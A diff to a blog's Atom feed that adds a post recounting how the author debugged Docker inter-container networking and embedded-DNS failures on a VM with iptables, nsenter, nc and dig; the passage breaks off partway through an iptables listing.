@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Programming & Software | David Xia]]></title>
   <link href="https://www.davidxia.com/categories/programming-and-software/atom.xml" rel="self"/>
   <link href="https://www.davidxia.com/"/>
-  <updated>2021-01-27T16:16:34-05:00</updated>
+  <updated>2021-05-02T23:41:44+00:00</updated>
   <id>https://www.davidxia.com/</id>
   <author>
     <name><![CDATA[David Xia]]></name>
@@ -12,6 +12,557 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[What I Recently Learned About Docker Networking and Debugging Networking Issues in General]]></title>
+    <link href="https://www.davidxia.com/2021/05/what-i-recently-learned-about-docker-networking-and-debugging-network-issues-in-general/"/>
+    <updated>2021-05-02T16:39:02-07:00</updated>
+    <id>https://www.davidxia.com/2021/05/what-i-recently-learned-about-docker-networking-and-debugging-network-issues-in-general</id>
+    <content type="html"><![CDATA[<p>This is a story about how debugged a confounding local development environment issue, what I
+learned about Docker in the process, and the generally applicable debugging strategies and
+techniques that helped me ultimately solve it. Skip to the end if you only want to read the
+debugging strategies and techniques. The overall story, however, will illustrate how they applied
+in this specific case.</p>
+
+<h2>Problem Statement and Use Case</h2>
+
+<p>A data infrastructure team at work provides a tool for starting a data pipeline job from a local
+development environment. Let&rsquo;s call this tool <code>foo</code>. This tool depends on <code>gcloud</code> and <code>docker</code>.
+It creates a user-defined Docker network, runs a utility container called <code>bar</code> connected to that
+network, and then runs another container called qux that talks to bar to retrieve Oauth tokens
+from Google Cloud Platform (GCP).</p>
+
+<p>Most developers run <code>foo</code> on their local workstations, e.g. Macbooks. But I have the newer
+Macbook with the Apple M1 ARM-based chip. <a href="https://docs.docker.com/docker-for-mac/install/">Docker Desktop on Mac</a> support for M1s was
+relatively recent. I didn&rsquo;t want deal with Docker weirdness. I also didn&rsquo;t have a lot of free
+disk space on my 256GB Macbook and thus didn&rsquo;t feel like clogging up my drive with lots of Java,
+Scala, and Docker gunk.</p>
+
+<p>So I tried running <code>foo</code> on a GCE VM configured by our <a href="https://puppet.com/">Puppet</a> configuration files. I ran <code>foo</code>,
+I got this error.</p>
+
+<h2>Error #1: inter-container networking failed between containers attached to user-defined Docker networks</h2>
+
+<pre><code>dxia@my-host$ foo --verbose run -f data-info.yaml -w DumpKubernetesContainerImagesJob -p 2021-04-26 -r my-project/target/image-name
+DEBUG:verify: Docker network `foo-network` already exists
+DEBUG:verify: bar container found.
+INFO:run: starting workflow DumpKubernetesContainerImagesJob ...
+ERROR: (gcloud.auth.activate-service-account) [Errno 110] Connection timed out
+This may be due to network connectivity issues. Please check your network settings, and the status of the service you are trying to reach.
+Traceback (most recent call last):
+  File "/usr/local/bin/activate-google-application-credentials", line 19, in &lt;module&gt;
+    'auth', 'activate-service-account', '--key-file', json_path])
+  File "/usr/lib/python3.6/subprocess.py", line 311, in check_call
+    raise CalledProcessError(retcode, cmd)
+subprocess.CalledProcessError: Command '['gcloud', 'auth', 'activate-service-account', '--key-file', '/etc/_foo/gcp-sa-key.json']' returned non-zero exit status 1.
+ERROR:foo:
+
+  RAN: /usr/bin/docker run -it -v /home/dxia/my-project/_foo:/etc/_foo:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/site-packages/oauth2client/__init__.py:ro --net foo-network -e FOO_COMPONENT_ID=my-project -e FOO_WORKFLOW_ID=DumpKubernetesContainerImagesJob -e FOO_PARAMETER=2021-04-26 -e FOO_DOCKER_IMAGE=my-project:20210426T211411-2b5452d -e 'FOO_DOCKER_ARGS=wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-26' -e FOO_EXECUTION_ID=foorun-2e30c385-2f89-494c-bc0e-97b3eff316d5 -e FOO_TRIGGER_ID=foo-942f155b-49eb-4af8-a6e4-3adf6f72577b -e FOO_TRIGGER_TYPE=foo -e FOO_ENVIRONMENT=foo -e FOO_LOGGING=text -e GOOGLE_APPLICATION_CREDENTIALS=/etc/_foo/gcp-sa-key.json -e FOO_SERVICE_ACCOUNT=dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com gcr.io/xpn-1/my-project:20210426T211411-2b5452d wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-26
+
+  STDOUT:
+
+
+  STDERR:
+Traceback (most recent call last):
+  File "/home/dxia/my-project//lib/python3.6/site-packages/foo/foo.py", line 304, in main
+    args.func(args)
+  File "/home/dxia/my-project//lib/python3.6/site-packages/foo/foo.py", line 269, in _run
+    args.declarative_infra,
+  File "/home/dxia/my-project//lib/python3.6/site-packages/foo/run.py", line 641, in run_workflow
+    declarative_infra,
+  File "/home/dxia/my-project//lib/python3.6/site-packages/foo/run.py", line 161, in _run_workflow
+    p.wait()
+  File "/home/dxia/my-project//lib/python3.6/site-packages/sh.py", line 841, in wait
+    self.handle_command_exit_code(exit_code)
+  File "/home/dxia/my-project//lib/python3.6/site-packages/sh.py", line 865, in handle_command_exit_code
+    raise exc
+sh.ErrorReturnCode_1:
+
+  RAN: /usr/bin/docker run -it -v /home/dxia/my-project/_foo:/etc/_foo:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/site-packages/oauth2client/__init__.py:ro --net foo-network -e FOO_COMPONENT_ID=my-project -e FOO_WORKFLOW_ID=DumpKubernetesContainerImagesJob -e FOO_PARAMETER=2021-04-26 -e FOO_DOCKER_IMAGE=my-project:20210426T211411-2b5452d -e 'FOO_DOCKER_ARGS=wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-26' -e FOO_EXECUTION_ID=foorun-2e30c385-2f89-494c-bc0e-97b3eff316d5 -e FOO_TRIGGER_ID=foo-942f155b-49eb-4af8-a6e4-3adf6f72577b -e FOO_TRIGGER_TYPE=foo -e FOO_ENVIRONMENT=foo -e FOO_LOGGING=text -e GOOGLE_APPLICATION_CREDENTIALS=/etc/_foo/gcp-sa-key.json -e FOO_SERVICE_ACCOUNT=dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com gcr.io/xpn-1/my-project:20210426T211411-2b5452d wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-26
+
+  STDOUT:
+
+
+  STDERR:
+</code></pre>
+
+<p>The HTTP connection timed out. First I checked whether the container started by <code>foo</code> can make a TCP
+connection to the bar container. I ran <code>foo --verbose run -f data-info.yaml -w
+DumpKubernetesContainerImagesJob -p 2021-04-26 -r my-project/target/image-name</code>
+again and did the following in another terminal window.</p>
+
+<p><a href="https://man7.org/linux/man-pages/man1/nsenter.1.html"><code>nsenter</code></a> is a cool tool that allows you to run programs in different Linux namespaces.
+It&rsquo;s very useful when you can&rsquo;t get an executable shell into a container with commands like
+<code>docker exec -it ... bash</code>. This can happen when the container doesn&rsquo;t even include any shells
+and just has the binary executable for instance.</p>
+
+<pre><code>dxia@my-host:~$ docker ps
+CONTAINER ID        IMAGE                                                                    COMMAND                  CREATED             STATUS              PORTS                     NAMES
+a0e872188831        my-project:20210426T211411-2b5452d         "/usr/local/bin/edge…"   2 seconds ago       Up 1 second                                   relaxed_pike
+4dda670a2ee1        foo/bar:latest                                   "./bar"               2 hours ago         Up 2 hours          0.0.0.0:80-&gt;80/tcp        bar
+
+dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  a0e872188831)  nc 172.20.0.127 80 -nvz -w 5
+(UNKNOWN) [172.20.0.127] 80 (http) : Connection timed out
+</code></pre>
+
+<p>So the HTTP connection timeout was caused by an error lower down on the networking stack: an
+inability to establish a TCP connection. A TCP connection from the host to bar worked though.</p>
+
+<pre><code>dxia@my-host:~$ nc 172.20.0.127 80 -nvz -w 5
+(UNKNOWN) [172.20.0.127] 80 (http) open
+</code></pre>
+
+<p>When I see a networking issue like this, I know there might be some misconfigured firewall rule
+blocking IP packets. I listed all the firewall rules. The ones in the filter table&rsquo;s <code>FORWARD</code>
+chain caught my attention.</p>
+
+<pre><code>dxia@my-host:~$ sudo iptables --list FORWARD --verbose --numeric --line-numbers --table filter
+Chain FORWARD (policy DROP 38 packets, 2280 bytes)
+num   pkts bytes target     prot opt in     out     source               destination
+1     6204  492K DOCKER-USER  all  --  *      *       0.0.0.0/0            0.0.0.0/0
+2     6204  492K DOCKER-ISOLATION-STAGE-1  all  --  *      *       0.0.0.0/0            0.0.0.0/0
+3     3080  323K ACCEPT     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
+4        1    60 DOCKER     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0
+5     3085  167K ACCEPT     all  --  corp0 !corp0  0.0.0.0/0            0.0.0.0/0
+6        0     0 ACCEPT     all  --  corp0 corp0  0.0.0.0/0            0.0.0.0/0
+7      264 17722 DOCKER     all  --  *      br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
+8     7382   17M ACCEPT     all  --  br-8ce7e363e4f9 !br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
+</code></pre>
+
+<p>I disabled the GCE VM&rsquo;s cronned Puppet run and then ran <code>sudo systemctl restart docker</code>. I ran
+bar and a test nginx1 container connected to <code>foo-network</code>.</p>
+
+<pre><code>dxia@my-host:~$ docker run --rm -d -v ~/.config/gcloud/:/.config/gcloud --name bar --net foo-network --ip 172.20.0.127 -p 80:80 foo/bar:latest
+3f9cc17b3f71e7056fd8072449afa78eb9a6a166ac091d751b69545ead0438b1
+
+dxia@my-host:~$ docker run --net foo-network --name nginx1 -d -p 8080:80 nginx:latest
+1b0b2b981f9389a989aa8f60a141b5e9a18ba5582141b6668c9078b6312dcfaf
+
+dxia@my-host:~$ docker ps
+CONTAINER ID        IMAGE                                                                    COMMAND                  CREATED              STATUS              PORTS                     NAMES
+1b0b2b981f93        nginx:latest                                                             "/docker-entrypoint.…"   5 seconds ago        Up 3 seconds        0.0.0.0:8080-&gt;80/tcp      nginx1
+3f9cc17b3f71        foo/bar:latest                                   "./bar"               About a minute ago   Up 59 seconds       0.0.0.0:80-&gt;80/tcp        bar
+</code></pre>
+
+<p>Now a TCP connection from the nginx container to bar succeeded.</p>
+
+<pre><code>dxia@my-host:~$ sudo nsenter --net=$(docker inspect --format  nginx1) nc 172.20.0.127 80 -nvz -w 5
+(UNKNOWN) [172.20.0.127] 80 (http) open
+</code></pre>
+
+<p>I checked iptables rules again and saw two additional rules (7 and 8) in the filter table&rsquo;s
+<code>FORWARD</code> chain. Rule 8 allowed IP packets coming in from the <code>br-8ce7e363e4f9</code> network interface
+(in this case a <a href="https://developers.redhat.com/blog/2018/10/22/introduction-to-linux-interfaces-for-virtual-networking/#bridge">Linux bridge</a>) and leaving through the same interface.</p>
+
+<pre><code>dxia@my-host:~$ sudo iptables --list FORWARD --verbose --numeric --line-numbers --table filter
+Chain FORWARD (policy DROP 0 packets, 0 bytes)
+num   pkts bytes target     prot opt in     out     source               destination
+1        0     0 DOCKER-USER  all  --  *      *       0.0.0.0/0            0.0.0.0/0
+2        0     0 DOCKER-ISOLATION-STAGE-1  all  --  *      *       0.0.0.0/0            0.0.0.0/0
+3        0     0 ACCEPT     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
+4        0     0 DOCKER     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0
+5        0     0 ACCEPT     all  --  corp0 !corp0  0.0.0.0/0            0.0.0.0/0
+6        0     0 ACCEPT     all  --  corp0 corp0  0.0.0.0/0            0.0.0.0/0
+7        0     0 ACCEPT     all  --  *      br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
+8        0     0 ACCEPT     all  --  br-8ce7e363e4f9 br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
+9      264 17722 DOCKER     all  --  *      br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
+10    7382   17M ACCEPT     all  --  br-8ce7e363e4f9 !br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
+</code></pre>
+
+<p>When I re-ran Puppet rules 7 and 8 were deleted and containers on the <code>foo-network</code> were again
+unable to establish a TCP connection. I added rule 8 manually and confirmed this is the rule
+causing my error above.</p>
+
+<pre><code>dxia@my-host:~$ sudo iptables --table filter --append FORWARD --in-interface br-8ce7e363e4f9 --out-interface br-8ce7e363e4f9 --source 0.0.0.0/0 --destination 0.0.0.0/0 --jump ACCEPT
+
+dxia@my-host:~$ sudo iptables --list FORWARD --verbose --numeric --line-numbers --table filter
+Chain FORWARD (policy DROP 0 packets, 0 bytes)
+num   pkts bytes target     prot opt in     out     source               destination
+1    23526 1377K DOCKER-USER  all  --  *      *       0.0.0.0/0            0.0.0.0/0
+2    23526 1377K DOCKER-ISOLATION-STAGE-1  all  --  *      *       0.0.0.0/0            0.0.0.0/0
+3    11728  755K ACCEPT     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
+4        1    60 DOCKER     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0
+5    11737  617K ACCEPT     all  --  corp0 !corp0  0.0.0.0/0            0.0.0.0/0
+6        0     0 ACCEPT     all  --  corp0 corp0  0.0.0.0/0            0.0.0.0/0
+7      182 12970 DOCKER     all  --  *      br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
+8       39  2748 ACCEPT     all  --  br-8ce7e363e4f9 !br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
+9        0     0 ACCEPT     all  --  br-8ce7e363e4f9 br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
+
+dxia@my-host:~$ sudo nsenter --net=$(docker inspect --format  nginx1) nc 172.20.0.127 80 -nvz -w 5
+(UNKNOWN) [172.20.0.127] 80 (http) open
+</code></pre>
+
+<p>Now running <code>foo</code> gave a different error.</p>
+
+<h2>Error #2: DNS queries for external records from bar failed</h2>
+
+<pre><code>dxia@my-host$ foo run -f data-info.yaml -w DumpKubernetesContainerImagesJob -p 2021-04-26 -r my-project/target/image-name
+INFO:run: starting workflow DumpKubernetesContainerImagesJob ...
+ERROR: (gcloud.auth.activate-service-account) There was a problem refreshing your current auth tokens: Invalid response 500.
+Please run:
+
+  $ gcloud auth login
+
+to obtain new credentials.
+
+If you have already logged in with a different account:
+
+    $ gcloud config set account ACCOUNT
+
+to select an already authenticated account to use.
+Traceback (most recent call last):
+  File "/usr/local/bin/activate-google-application-credentials", line 19, in &lt;module&gt;
+    'auth', 'activate-service-account', '--key-file', json_path])
+  File "/usr/lib/python3.6/subprocess.py", line 311, in check_call
+    raise CalledProcessError(retcode, cmd)
+subprocess.CalledProcessError: Command '['gcloud', 'auth', 'activate-service-account', '--key-file', '/etc/_foo/gcp-sa-key.json']' returned non-zero exit status 1.
+ERROR:foo: non-zero exit code (1) from `/usr/bin/docker run -it -v /home/dxia/my-project/_foo:/etc/_foo:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/site-packages/oauth2client/__init__.py:ro --net foo-network -e FOO_COMPONENT_ID=my-project -e FOO_WORKFLOW_ID=DumpKubernetesContainerImagesJob -e FOO_PARAMETER=2021-04-02 -e FOO_DOCKER_IMAGE=my-project:20210422T065801-2b5452d -e 'FOO_DOCKER_ARGS=wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-02' -e FOO_EXECUTION_ID=foorun-3feaee45-35e4-4c01-9430-86de52eb2db1 -e FOO_TRIGGER_ID=foo-f721de7f-edf9-4bb3-8cdf-1e9bbcec5035 -e FOO_TRIGGER_TYPE=foo -e FOO_ENVIRONMENT=foo -e FOO_LOGGING=text -e GOOGLE_APPLICATION_CREDENTIALS=/etc/_foo/gcp-sa-key.json -e FOO_SERVICE_ACCOUNT=dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com gcr.io/xpn-1/my-project:20210422T065801-2b5452d wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-02`
+</code></pre>
+
+<p>The only background knowledge we need to know here is that the qux container is sending a Google
+Service Account (GSA) JSON credential with <code>"token_uri": "http://172.20.0.127:80/token"</code>. Bar
+then uses that token for further GCP API requests. So bar needs to query DNS for
+accounts.google.com. Bar container logs show that it cannot lookup the DNS A record for
+accounts.google.com by querying <code>127.0.0.11:53</code>.</p>
+
+<pre><code>dxia@my-host:~$ docker ps
+CONTAINER ID        IMAGE                                                                    COMMAND                  CREATED             STATUS              PORTS                     NAMES
+1b0b2b981f93        nginx:latest                                                             "/docker-entrypoint.…"   9 hours ago         Up 9 hours          0.0.0.0:8080-&gt;80/tcp      nginx1
+3f9cc17b3f71        foo/bar:latest                                   "./bar"               9 hours ago         Up 9 hours          0.0.0.0:80-&gt;80/tcp        bar
+
+dxia@my-host:~$ docker logs --follow bar
+2021/04/22 05:54:19 bar started
+2021/04/22 06:59:13 Received JWT assertion: [REDACTED base-64 string]
+2021/04/22 06:59:13 Servive account name:  projects/-/serviceAccounts/dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com
+2021/04/22 06:59:28 Post https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com:generateAccessToken?alt=json&amp;prettyPrint=false: Post https://accounts.google.com/o/oauth2/token: dial tcp: lookup accounts.google.com on 127.0.0.11:53: read udp 127.0.0.1:46920-&gt;127.0.0.11:53: i/o timeout
+2021/04/22 06:59:28 Failed to create new token for dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com
+</code></pre>
+
+<p>I wondered why bar was querying <code>127.0.0.11</code> for DNS. It turns out this is another loopback
+address. In fact, all of <code>127.0.0.0/8</code> is loopback according to <a href="https://tools.ietf.org/html/rfc6890">RFC-6890</a>. I guess Docker
+containers that are attached to user-defined Docker networks are configured by default to use
+<code>127.0.0.11</code> in their <code>/etc/resolv.conf</code>.</p>
+
+<pre><code>dxia@my-host$ docker ps
+CONTAINER ID        IMAGE                                                                    COMMAND                  CREATED             STATUS              PORTS                     NAMES
+1b0b2b981f93        nginx:latest                                                             "/docker-entrypoint.…"   9 hours ago         Up 9 hours          0.0.0.0:8080-&gt;80/tcp      nginx1
+3f9cc17b3f71        foo/bar:latest                                   "./bar"               9 hours ago         Up 9 hours          0.0.0.0:80-&gt;80/tcp        bar
+
+dxia@my-host$ docker exec -it nginx1 /bin/sh -c "cat /etc/resolv.conf"
+
+search corp.net
+nameserver 127.0.0.11
+options attempts:1 timeout:5 ndots:0
+</code></pre>
+
+<p>Why were these Docker containers configured to query for DNS records on <code>127.0.0.11</code>? It turned
+out after some Googling that</p>
+
+<blockquote><p>By default, a container inherits the DNS settings of the host, as defined in the /etc/resolv.conf
+configuration file. Containers that use the default bridge network get a copy of this file,
+whereas containers that use a custom network use Docker’s embedded DNS server, which forwards
+external DNS lookups to the DNS servers configured on the host.</p></blockquote>
+
+<p>&mdash; <a href="https://docs.docker.com/config/containers/container-networking/">https://docs.docker.com/config/containers/container-networking/</a></p>
+
+<p>Now I wondered if Docker&rsquo;s embedded DNS server is actually running. After some more Googling, I
+realized that each container also had its own set of firewall rules. So I listed bar&rsquo;s nat
+table&rsquo;s <code>DOCKER_OUTPUT</code> chain&rsquo;s rules. These two rules showed that the destination port is
+changed for TCP packets bound for 127.0.0.11:53 to 37619. UDP packets have their port changed to
+58552.</p>
+
+<pre><code>dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) sudo iptables --list DOCKER_OUTPUT --verbose --numeric --line-numbers --table nat
+
+Chain DOCKER_OUTPUT (1 references)
+ pkts bytes target     prot opt in     out     source               destination
+    0     0 DNAT       tcp  --  *      *       0.0.0.0/0            127.0.0.11           tcp dpt:53 to:127.0.0.11:37619
+    0     0 DNAT       udp  --  *      *       0.0.0.0/0            127.0.0.11           udp dpt:53 to:127.0.0.11:58552
+</code></pre>
+
+<p>Whatever&rsquo;s listening on those ports was accepting TCP and UDP connections.</p>
+
+<pre><code>dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) nc 127.0.0.11 58552 -nvzu -w 5
+(UNKNOWN) [127.0.0.11] 58552 (?) open
+dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) nc 127.0.0.11 37619 -nvz -w 5
+(UNKNOWN) [127.0.0.11] 37619 (?) open
+</code></pre>
+
+<p>But there was no DNS reply from either.</p>
+
+<pre><code>dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) dig @127.0.0.11 -p 58552 accounts.google.com
+
+; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.11 -p 58552 accounts.google.com
+; (1 server found)
+;; global options: +cmd
+;; connection timed out; no servers could be reached
+
+dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) dig @127.0.0.11 -p 37619 accounts.google.com +tcp
+
+; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.11 -p 37619 accounts.google.com +tcp
+; (1 server found)
+;; global options: +cmd
+;; connection timed out; no servers could be reached
+</code></pre>
+
+<p>Docker daemon was listening for DNS queries at that IP and port from within bar.</p>
+
+<pre><code>dxia@my-host$ sudo nsenter -n -p -t $(docker inspect --format  bar) ss -utnlp
+Netid        State          Recv-Q         Send-Q                    Local Address:Port                    Peer Address:Port
+udp          UNCONN         0              0                            127.0.0.11:58552                        0.0.0.0:*             users:(("dockerd",pid=10984,fd=38))
+tcp          LISTEN         0              128                          127.0.0.11:37619                        0.0.0.0:*             users:(("dockerd",pid=10984,fd=40))
+tcp          LISTEN         0              128                                   *:80                                 *:*             users:(("bar",pid=12150,fd=3))
+</code></pre>
+
+<p>After enabling <code>log-level": "debug"</code> in <code>/etc/docker/daemon.json</code> and reloading the configuration
+file, I saw that the daemon was trying to forward the DNS query to 10.99.0.1. This was the IP of
+the <code>corp0</code> bridge network interface which we create instead of the default <code>docker0</code> bridge
+network. I saw there was an IO timeout when the daemon was waiting for the DNS reply.</p>
+
+<pre><code>dxia@my-host$ sudo journalctl --follow -u docker
+-- Logs begin at Tue 2019-11-05 18:17:27 UTC. --
+Apr 22 15:43:12 my-host.corp.net dockerd[10984]: time="2021-04-22T15:43:12.496979903Z" level=debug msg="[resolver] read from DNS server failed, read udp 172.20.0.127:37928-&gt;10.99.0.1:53: i/o timeout"
+Apr 22 15:43:13 my-host.corp.net dockerd[10984]: time="2021-04-22T15:43:13.496539033Z" level=debug msg="Name To resolve: accounts.google.com."
+Apr 22 15:43:13 my-host.corp.net dockerd[10984]: time="2021-04-22T15:43:13.496958664Z" level=debug msg="[resolver] query accounts.google.com. (A) from 172.20.0.127:51642, forwarding to udp:10.99.0.1"
+</code></pre>
+
+<p>We set dockerd&rsquo;s upstream DNS server as 10.99.0.1 because we have unbound running as a DNS
+proxy/cache on the host. We configured it to bind on the bridge interface so Docker containers
+can hit the host-local unbound instance by routing DNS requests to corp0.</p>
+
+<p>So why can&rsquo;t the daemon forward IP packets from 172.20.0.127:37928 to 10.99.0.1:53? It seemed
+like UDP packets sent from bar were able to reach 10.99.0.1:53, but DNS requests failed. I also
+knew DNS requests from the host to 10.99.0.1:53 worked.</p>
+
+<pre><code>dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) nc 10.99.0.1 53 -nvzu -w 5
+(UNKNOWN) [10.99.0.1] 53 (domain) open
+
+dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) dig @10.99.0.1 accounts.google.com
+
+; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @10.99.0.1 accounts.google.com
+; (1 server found)
+;; global options: +cmd
+;; connection timed out; no servers could be reached
+
+dxia@my-host:~$ dig @10.99.0.1 accounts.google.com
+
+; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @10.99.0.1 accounts.google.com
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 39308
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;accounts.google.com.       IN  A
+
+;; ANSWER SECTION:
+accounts.google.com.    108 IN  A   142.250.31.84
+
+;; Query time: 1 msec
+;; SERVER: 10.99.0.1#53(10.99.0.1)
+;; WHEN: Mon Apr 26 23:58:28 UTC 2021
+;; MSG SIZE  rcvd: 64
+</code></pre>
+
+<p>My hypothesis at this point was that Docker&rsquo;s embedded DNS server wasn&rsquo;t working in some way.
+After exploring this for a while with no luck, I questioned my assumption that UDP packets from
+172.20.0.127:37928 were able to reach 10.99.0.1:53. I realized TCP packets from
+172.20.0.127:37928 were not able to reach 10.99.0.1:53.</p>
+
+<pre><code>dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) nc 10.99.0.1 53 -nvz -w 5
+(UNKNOWN) [10.99.0.1] 53 (domain) : Connection timed out
+</code></pre>
+
+<p>So why were UDP packets able to? Isn&rsquo;t UDP a fire-and-forget protocol? How can <code>nc</code> even tell if
+an IP and port is listening for UDP packets at all? It was good that I backtracked and questioned
+my assumption because it turns out that one <a href="https://serverfault.com/questions/416205/testing-udp-port-connectivity/416269#416269">cannot distinguish between an open UDP port and
+dropped packets en route to that port</a>.</p>
+
+<p>So it must be another networking issue which means there must be another firewall rule that&rsquo;s
+blocking packets from the bar container to 10.99.0.1. After a while of looking, I realized the
+filter table&rsquo;s <code>INPUT</code> chain&rsquo;s default policy was <code>DROP</code> and that there was no rule that matched
+packets coming in from the <code>br-8ce7e363e4f9</code> interface.</p>
+
+<pre><code>dxia@my-host:~$ sudo iptables --list INPUT --verbose --numeric --line-numbers --table filter
+Chain INPUT (policy DROP 0 packets, 0 bytes)
+num   pkts bytes target     prot opt in     out     source               destination
+1     434M  345G            all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 00 ACC-eth0 input */
+2        0     0            all  --  eth1   *       0.0.0.0/0            0.0.0.0/0            /* 00 ACC-eth1 input */
+3     7080  283K DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 000 drop invalid */ ctstate INVALID
+4    1907M  568G ipthrouput  all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 000 track forward */
+5     987M  414G ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 001 accept established */ ctstate RELATED,ESTABLISHED
+6     763M   95G ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0            /* 002 allow local */
